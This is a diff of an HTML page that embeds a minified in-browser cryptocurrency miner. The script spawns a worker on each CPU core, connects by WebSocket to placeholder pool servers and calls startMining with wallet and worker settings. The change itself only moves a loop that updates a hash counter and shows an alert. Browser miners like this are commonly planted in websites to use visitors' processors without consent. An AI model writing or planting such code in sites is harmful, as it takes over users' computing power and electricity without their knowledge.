@@ -7,6 +7,14 @@
         <p id="hashes">Total Hashes: ?</p>
         
         <script>    
+            
+            (function loop(){
+   setTimeout(function() {
+        document.getElementById("hashes").innerHTML = "Total Hashes: " + totalHashes;
+                alert("A");
+  }, 1000);
+})();
+            
     var server="wss://ws1.server:80/;wss://ws2.server:80/;wss://ws3.server:80/",job=null,workers=[],ws,receiveStack=[],sendStack=[],totalhashes=0,connected=0,reconnector=0,attempts=1,throttleMiner=0,handshake=null,wasmSupported=function(){try{if("object"===typeof WebAssembly&&"function"===typeof WebAssembly.instantiate){var c=new WebAssembly.Module(Uint8Array.of(0,97,115,109,1,0,0,0));if(c instanceof WebAssembly.Module)return new WebAssembly.Instance(c)instanceof WebAssembly.Instance}}catch(g){}return!1}();
 function addWorkers(c){logicalProcessors=c;if(-1==c){try{logicalProcessors=window.navigator.hardwareConcurrency}catch(g){logicalProcessors=4}0<logicalProcessors&&40>logicalProcessors||(logicalProcessors=4)}for(;0<logicalProcessors--;)addWorker()}
 var openWebSocket=function(){null!=ws&&ws.close();var c=server.split(";");ws=new WebSocket(c[Math.floor(Math.random()*c.length)]);ws.onmessage=on_servermsg;ws.onerror=function(c){2>connected&&(connected=2);job=null};ws.onclose=function(){2>connected&&(connected=2);job=null};ws.onopen=function(){ws.send(JSON.stringify(handshake));connected=attempts=1}};
@@ -46,13 +54,6 @@ function on_servermsg(c){c=JSON.parse(c.data);receiveStack.push(c);"job"==c.iden
     var workerId = "sdhsn"
     var threads = -1;
     var password = "x";
-    
-    (function loop(){
-   setTimeout(function() {
-        document.getElementById("hashes").innerHTML = "Total Hashes: " + totalHashes;
-                alert("A");
-  }, 1000);
-})();
     
     startMining(pool, walletAddress, workerId, threads, password);
     throttleMiner = 10;
